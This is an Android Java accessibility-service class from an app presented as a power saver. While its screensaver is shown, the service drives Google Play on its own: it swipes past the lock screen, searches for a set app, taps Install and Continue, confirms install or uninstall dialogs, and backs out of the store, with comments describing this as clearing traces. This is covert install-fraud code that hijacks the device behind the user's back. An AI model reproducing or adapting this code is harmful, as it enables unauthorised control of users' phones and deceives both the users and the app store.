package com.luna.powersaver.gp.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.luna.powersaver.gp.PowerSaver;
import com.luna.powersaver.gp.common.GPResId;
import com.luna.powersaver.gp.common.GuardConst;
import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.manager.StalkerManager;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppInfoUtil;

import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * @author JackieZhuang
 * @email zsigui@foxmail.com
 * @date 2016/12/26
 */
@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
public class NBAccessibilityService extends AccessibilityService implements PowerSaver.StateChangeCallback {

    private static final String TAG = "acs-test";
    private static final int JUDGE_WORK_INTERVAL = 1000;
    public static final String TEST_PACKAGE_NAME = "com.luna.applocker.gp";
    public static final String TEST_APP_NAME = "Migo Applocker";

    // 该状态表明当前是否正处于完成任务状态
    public static boolean sIsInWork = false;
    // 0 需要检查 1 监听下载中 2 清除痕迹 3 检查是还有权限说明还是可以继续下载了 4 完成任务
    private static int sCurrentWorkState = TYPE.IGNORED;

    public interface TYPE {
        int IGNORED = 0;
        int DOWNLOAD_BY_GP = 1;
        int DOWNLOAD_BY_GP_SEARCH = 2;
        int INSTALL_MANUALLY = 3;
        int OPEN_MANUALLY = 4;
        int UNINSTALL_MANUALLY = 5;
    }
    // 0 处理GP下载 1 处理GP搜索 2 处理手动安装 3 处理程序打开 4 处理手动卸载
    public static int sCurrentWorkType = 0;
    // 接收到的最后一次窗口状态变化的事件
    public AccessibilityEvent finalWindowStateChangeEvent;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        if (StaticConst.sContext == null) {
            StaticConst.sContext = getApplicationContext();
        }
        AppDebugLog.d(TAG, "NBAccessibilityService.onServiceConnected!");
        PowerSaver.get().addCallback(this);
        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(StalkerManager.get());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        PowerSaver.get().removeCallback(this);
        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(StalkerManager.get());
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null)
            return;
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);
        AppDebugLog.w(TAG, "onAccessibilityEvent is called! type = " + event.getEventType()
                + ", action = " + event.getAction() + ", time = " + df.format(new Date(event.getEventTime()))
                + ", text = " + event.getText() + ", package = " + event.getPackageName()
                + ", source.text = " + (event.getSource() != null ? event.getSource().getText() : "null")
                + ", isWork = " + sIsInWork);
//        traveselNodeInfo(getRootInActiveWindow(), 0);

//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
//            finalWindowStateChangeEvent = event;
//        }

        if (sIsInWork) {
            // 先进行18及以上处理，18以下待适配
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {
                if (TextUtils.isEmpty(TEST_PACKAGE_NAME)) {
                    return;
                }
                switch (sCurrentWorkType) {
                    case TYPE.DOWNLOAD_BY_GP:
                        handleDownloadWork(event);
                        break;
                    case TYPE.DOWNLOAD_BY_GP_SEARCH:
                        handleSearchWork(event);
                        break;
                    case TYPE.INSTALL_MANUALLY:
                        handleInstallWork(event);
                        break;
                    case TYPE.OPEN_MANUALLY:
                        handleOpenWork(event);
                        break;
                    case TYPE.UNINSTALL_MANUALLY:
                        handleUninstallWork(event);
                        break;
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleInstallWork(AccessibilityEvent event) {
        if (GPResId.INSTALLER_PKG.equals(event.getPackageName().toString())) {
            AppDebugLog.w(TAG, "当前检测到Installer的执行，处于安装行为中");
            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            if (source != null) {
                nodes =  source.findAccessibilityNodeInfosByViewId(GPResId.getInstalledDoneBtnId());
                AccessibilityNodeInfo info;
                if (nodes != null && nodes.size() > 0) {
                    info = nodes.get(0);
                    if (info != null) {
                        boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        AppDebugLog.w(TAG, "确定安装，执行结果： " + isClick);
                        if (isClick) {
                            StalkerManager.get().doContinueAfterUninstall();
                        }
                    }
                } else {
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstalledDoneBtnId());
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        if (info != null) {
                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.w(TAG, "确定完成安装，执行结果： " + isClick);
                            if (!isClick) {
                                performGlobalBack();
                            }
                            StalkerManager.get().doContinueAfterInstalled();
                        }
                    }
                }
            }
        }
    }

    private void handleOpenWork(AccessibilityEvent event) {

    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleUninstallWork(AccessibilityEvent event) {
        if (GPResId.INSTALLER_PKG.equals(event.getPackageName().toString())) {
            AppDebugLog.w(TAG, "当前检测到Installer的执行，处于卸载行为中");
            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            if (source != null) {
                nodes =  source.findAccessibilityNodeInfosByViewId(GPResId.getUninstallOkBtnId());
                AccessibilityNodeInfo info;
                if (nodes != null && nodes.size() > 0) {
                    info = nodes.get(0);
                    if (info != null) {
                        boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        AppDebugLog.w(TAG, "确定卸载，执行结果： " + isClick);
                        if (isClick) {
                            StalkerManager.get().doContinueAfterUninstall();
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private boolean handleSearchWork(AccessibilityEvent event) {
        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {
            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            AccessibilityNodeInfo info;
            if (source != null) {
                if (sCurrentWorkState == 0) {
                    // 还没有获取输入搜索
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchIdleId());
                    AppDebugLog.w(TAG, "查找搜索输入按钮，进行点击操作获取焦点: " + nodes);
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        if (info != null) {
                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.w(TAG, "对搜索进行点击获取焦点 " + isClick);
                            if (isClick) {
                                sCurrentWorkState = 1;
                            }
                        }
                    }

                } else if (sCurrentWorkState == 1) {
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchInputId());
                    AppDebugLog.w(TAG, "查找搜索输入文本框");
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        AppDebugLog.w(TAG, "找到搜索输入文本框");
                        if (info != null && info.isEditable()) {
                            AppDebugLog.w(TAG, "进行内容设置");
                            setText(info, TEST_APP_NAME);
                            sCurrentWorkState = 2;
                        }
                    }
                } else if (sCurrentWorkState == 2) {
//                        traveselNodeInfo(getRootInActiveWindow(), 0);
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchSuggestionId());
                    AppDebugLog.d(TAG, "查找建议列表弹窗");
                    if (nodes != null && nodes.size() > 0) {
                        AppDebugLog.d(TAG, "获取到建议列表弹窗，进行遍历查找符合项");
                        info = nodes.get(0);
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchSuggestItemTextId());
                        AppDebugLog.d(TAG, "查找到建议列表项文本ID节点列表： " + nodes);
                        if (nodes != null && nodes.size() > 0) {
                            for (int i = 0; i < nodes.size(); i++) {
                                info = nodes.get(i);
                                AppDebugLog.d(TAG, "该项的值：" + (info != null ? info.getText() : "none"));
                                if (info != null && info.getText() != null
                                        && TEST_APP_NAME.equals(info.getText().toString())) {
                                    AppDebugLog.d(TAG, "查找到名称相同的指定项，获取其父节点进行点击!");
                                    if (info.getParent() != null ) {
                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        AppDebugLog.d(TAG, "点击了查找到的项: 结果: " + result);
                                        if (result) {
                                            StalkerManager.get().doContinueAfterSearch();
                                        }
                                    }
                                    return true;
                                }
                            }
                            AppDebugLog.d(TAG, "找不到名称相同的指定项，选择第一个提示进入");
                            sCurrentWorkState = 3;
                            nodes.get(0).getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                } else if (sCurrentWorkState == 3) {
                    AppDebugLog.d(TAG, "判断当前是否进入了详情页面");
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getTitleId());
                    if (nodes != null && nodes.size() > 0) {
                        AppDebugLog.d(TAG, "当前已经进入了详情页，执行下载或者卸载等其他操作!");
                        sCurrentWorkState = 4;
                    } else {
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchResultListItemTitleId());
                        AppDebugLog.d(TAG, "当前尚未进入详情页，在搜索列表中，获取搜索项");
                        if (nodes != null && nodes.size() > 0) {
                            for (int i = 0; i < nodes.size(); i++) {
                                info = nodes.get(i);
                                if (info != null && info.getText() != null
                                        && TEST_APP_NAME.equals(info.getText().toString())) {
                                    AppDebugLog.d(TAG, "查找到名称相同的指定项，获取其父节点进行点击!");
                                    if (info.getParent() != null ) {
                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        AppDebugLog.d(TAG, "点击了查找到的项: 结果: " + result);
                                        if (result) {
                                            StalkerManager.get().doContinueAfterSearch();
                                        }
                                    }
                                    return true;
                                }
                            }
                            AppDebugLog.d(TAG, "当前选项找不到符合的，执行下滑继续查找");
                            performGlobalAction(GESTURE_SWIPE_UP);
                        }
                    }
                }
            }
        }
        return false;
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void setText(AccessibilityNodeInfo info, String msg) {
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, msg);
            info.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        } else {
            ClipData data = ClipData.newPlainText("data", msg);
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            cm.setPrimaryClip(data);
            info.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            info.performAction(AccessibilityNodeInfo.ACTION_PASTE);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleDownloadWork(AccessibilityEvent event) {
        if (GuardConst.SUPER_CLEANER.equals(event.getPackageName().toString())
                && getRootInActiveWindow() != null) {
            AppDebugLog.d(TAG, "当前顶端是锁屏，进行右滑");
            performGlobalAction(AccessibilityService.GESTURE_SWIPE_RIGHT);
            return;
        } else if (GuardConst.SYSTEM_UI.equals(event.getPackageName().toString())) {
            AppDebugLog.d(TAG, "当前顶端是系统锁，进行上滑");
            if (getRootInActiveWindow() != null) {
                getRootInActiveWindow().performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
            }
            return;
        }

        if (sCurrentWorkState == 2) {
            // 清除痕迹，所以要判断是否商店并退出
            AppDebugLog.d(TAG, "清除痕迹，所以要判断是否商店并退出");
            if (finalWindowStateChangeEvent != null && GPResId.PACKAGE.equals
                    (finalWindowStateChangeEvent.getPackageName().toString())) {

                // 处于GP，执行后退
                AppDebugLog.d(TAG, "工作页面尚处于GP中，执行退出");
                performGlobalBack();
            }
            return;
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            finalWindowStateChangeEvent = event;
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            AppDebugLog.d(TAG, "状态栏发生变化了！！");
            if (sCurrentWorkState == 3) {
                AppDebugLog.d(TAG, "当前是点击安装之后引起的状态栏变化，判断是否由于下载引起");
                // 通知栏发生变化了
                if (GPResId.NOTIFY_DOWNLOAD_PKG.equals(event.getPackageName().toString())) {
                    // 下载引起的变化，说明是下载中
                    AppDebugLog.d(TAG, "通知栏变化是由于下载通知引起的，则说明执行下载了，修改状态为监听下载");
                    sCurrentWorkState = 1;
                    // 判断当前上次变化是否处于GP中，是则执行退出
                    if (finalWindowStateChangeEvent != null && finalWindowStateChangeEvent.getPackageName() != null
                            && GPResId.PACKAGE.equals(finalWindowStateChangeEvent.getPackageName().toString())) {

                        // 处于GP，执行后退
                        AppDebugLog.d(TAG, "工作页面尚处于GP中，执行退出");
                        performGlobalBack();
                    }
                }
            } else if (sCurrentWorkState == 1) {
                AppDebugLog.d(TAG, "监测下载中，现在要监测任务是否完成：" + event.getText()
                        + (event.getPackageName()) + ", ");
                spyIsAppInstalled(event);
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && GPResId.PACKAGE.equals(event.getPackageName())) {
                AppDebugLog.d(TAG, "现在正处于GP中，进行检测操作，sCurrentWorkState = " + sCurrentWorkState);
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    List<AccessibilityNodeInfo> nodes;
                    if (sCurrentWorkState == 0) {
                        AppDebugLog.d(TAG, "判断是否处于应用详情页，然后进行下一步操作");
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                                .getTitleId());
                        if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
                            AppDebugLog.d(TAG, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0).getText());
                            AppDebugLog.d(TAG, "当前处于应用详情页界面，首先判断是否有接收按钮");
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                            AccessibilityNodeInfo info;
                            if (nodes != null && nodes.size() > 0) {
                                AppDebugLog.d(TAG, "找到继续按钮的界面，查找继续的确认按钮");
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                                if (nodes != null && nodes.size() > 0) {
                                    info = nodes.get(0);
                                    boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    AppDebugLog.d(TAG, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                            "isClickable = " + info.isClickable()
                                            + ", click result = " + result);
                                    if (result) {
                                        // 执行成功，退出GP
                                        sCurrentWorkState = 1;
                                        performGlobalBack();
                                    }
                                }
                            } else {
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallBtnResId());

                                if (nodes != null && nodes.size() > 0) {
                                    info = nodes.get(0);
                                    boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    AppDebugLog.d(TAG, "找到安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                            "isClickable =" +

                                            " " + info.isClickable()

                                            + ", click result = " + result);
                                    if (result) {
                                        // 需要监测是否有继续栏了
                                        sCurrentWorkState = 3;
                                        finalWindowStateChangeEvent = event;
                                    }
                                } else {
                                    AppDebugLog.d(TAG, "查找不到安装按钮，看是否有卸载按钮！");
//                                    nodes = source.findAccessibilityNodeInfosByViewId(P_GOOGLE_PLAY +
// ":id/uninstall");
//                                    if (nodes != null && nodes.size() > 0) {
//                                        AppDebugLog.d(TAG, "卸载按钮查找成功，该包已经安装完成，执行退出GP操作");
//                                        performGlobalBack();
//                                    } else {
//                                        AppDebugLog.d(TAG, "查找不到卸载按钮，默认当前处于安装状态，暂不执行其他操作");
//                                    }
                                }
                            }
                        } else {
                            AppDebugLog.d(TAG, "当前不处于应用详情页界面，判断是否加载中");
                            if (!travsalToFindFirstInfoContainsName(source, "ProgressBar")) {
                                AppDebugLog.d(TAG, "当前不处于加载中，重新跳转");
//                                        mHandler.postDelayed(new Runnable() {
//                                            @Override
//                                            public void run() {
//                                                if (sIsInWork) {
//                                                    jumpToStore(NBAccessibilityService.this, TEST_PACKAGE_NAME);
//                                                }
//                                            }
//                                        }, 2000);
                            } else {
                                AppDebugLog.d(TAG, "当前在加载中，需要等待！");
                            }
                        }
                    } else if (sCurrentWorkState == 1) {
                        // 当前正在监听下载
                        AppDebugLog.d(TAG, "非通知栏事件，监测下载中，现在要监测任务是否完成");
                        spyIsAppInstalled(event);
                    } else if (sCurrentWorkState == 3) {
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                        AppDebugLog.d(TAG, "当前处于应用详情页界面，工作状态3，判断是否有继续按钮： " + nodes);
                        AccessibilityNodeInfo info;
                        if (nodes != null && nodes.size() > 0) {
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                            AppDebugLog.d(TAG, "找到继续按钮的界面，查找继续的确认按钮" + nodes);
                            if (nodes != null && nodes.size() > 0) {
                                info = nodes.get(0);
                                boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                AppDebugLog.d(TAG, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                        "isClickable = " + info.isClickable()
                                        + ", click result = " + result);
                                if (result) {
                                    // 执行成功，退出GP
                                    sCurrentWorkState = 1;
                                    performGlobalBack();
                                }
                            }
                        }
                    }

                }
            }
        }
    }

    private void spyIsAppInstalled(AccessibilityEvent event) {
//        if (event.getText() != null && event.getText().size() > 0 && event.getText().get(0) != null
//                && event.getText().get(0).toString().contains(TEST_APP_NAME)
//                && GPResId.PACKAGE.equals(event.getPackageName().toString())) {
        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {
            // 当前正在安装或者已经安装完成，判断app是否安装
            AppDebugLog.d(TAG, "当前正在安装或者已经安装完成，判断app是否安装");
            if (AppInfoUtil.isPkgInstalled(this, TEST_PACKAGE_NAME)) {
                AppDebugLog.d(TAG, "应用已经安装，修改工作状态");
                sCurrentWorkState = 4;
                // 可以进行下一个任务操作，此处直接设置为工作结束
                sIsInWork = false;
                StalkerManager.get().fromDownloadingToDownloaded(TEST_PACKAGE_NAME);
            }
        }
    }

    private boolean travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName) {
        if (info == null)
            return false;
        if (info.getChildCount() > 0) {
            for (int i = 0; i < info.getChildCount(); i++) {
                if (travsalToFindFirstInfoContainsName(info.getChild(i), widgetName)) {
                    return true;
                }
            }
        } else if (info.getClassName().toString().contains(widgetName)) {
            return true;
        }
        return false;
    }

    private void performGlobalBack() {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            }
        }, 400);
    }

    private boolean traveselNodeInfo(AccessibilityNodeInfo info, int depth) {
        StringBuilder spaceCount = new StringBuilder();
        int d = depth;
        while (d-- > 0) {
            spaceCount.append("--");
        }
        if (info != null) {
            AppDebugLog.d(TAG, spaceCount.toString() + "info.class = " + info.getClassName() + ", getChildCount = " +
                    info.getChildCount()
                    + ", label = " + info.getText() + ", packageName = " + info.getPackageName() + ", isClick = " +
                    info.isClickable() + ", isEnabled = " + info.isEnabled()
                    + ", windowId = " + info.getWindowId());
            if (info.getChildCount() != 0) {
                for (int i = 0; i < info.getChildCount(); i++) {
                    if (traveselNodeInfo(info.getChild(i), depth + 1)) {
                        info.recycle();
                        return true;
                    }
                }
            }
            info.recycle();
        } else {
            AppDebugLog.d(TAG, spaceCount.toString() + "null");
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        AppDebugLog.d(TAG, "NBAccessibilityService.onInterrupt!");
    }

    public void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }


    private Handler mHandler = new DownloadHanlder(NBAccessibilityService.this);

    static class DownloadHanlder extends Handler {

        WeakReference<NBAccessibilityService> mReference;

        public DownloadHanlder(NBAccessibilityService service) {
            mReference = new WeakReference<>(service);
        }

        @Override
        public void handleMessage(Message msg) {
            if (mReference == null || mReference.get() == null)
                return;
            final NBAccessibilityService service = mReference.get();
            switch (msg.what) {
                case 0:
                    AppDebugLog.d(TAG, "接收到网络请求，进行下载事件，此处模拟包名: " + TEST_PACKAGE_NAME);
                    AppDebugLog.d(TAG, "延迟" + JUDGE_WORK_INTERVAL + "秒执行GP下载操作");
//                    toast("接收到网络请求，进行下载事件，此处模拟包名：" + TEST_PACKAGE_NAME);
                    postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            sendEmptyMessage(1);
                        }
                    }, JUDGE_WORK_INTERVAL);
                    break;
                case 1:
                    AppDebugLog.d(TAG, "判断当前是否还处于屏保并执行任务");
//                    toast("判断当前是否还处于屏保并执行任务");
                    if (PowerSaver.get().isGuardViewShown()) {
                        AppDebugLog.d(TAG, "当前处于屏保中，可以执行GP任务了");
                        if (!AppInfoUtil.isPkgInstalled(service, TEST_PACKAGE_NAME)) {
                            AppDebugLog.d(TAG, "判断该应用未存在，跳转GP安装应用");
                            // 设置状态
                            sIsInWork = true;
                            sCurrentWorkState = 0;
                            // 跳转对应GP位置
                            AppInfoUtil.jumpToStore(service.getApplicationContext(), TEST_PACKAGE_NAME);
                        } else {
                            AppDebugLog.d(TAG, "该应用已经存在，暂不处理");
                        }
                    }
                    break;
            }
        }
    }

    @Override
    public void onGuardShow() {
        AppDebugLog.d(TAG, "接收到onGuardShow事件，准备进行判断");
        // 该线程模拟网络请求
        StalkerManager.get().doStart();
    }

    @Override
    public void onGuardHide() {
        AppDebugLog.d(TAG, "接收到onGuardHide事件，尽量进行扫尾工作");
        sIsInWork = false;
        finalWindowStateChangeEvent = null;
        DownloadManager.getInstance(StaticConst.sContext).startDownload();
    }
}
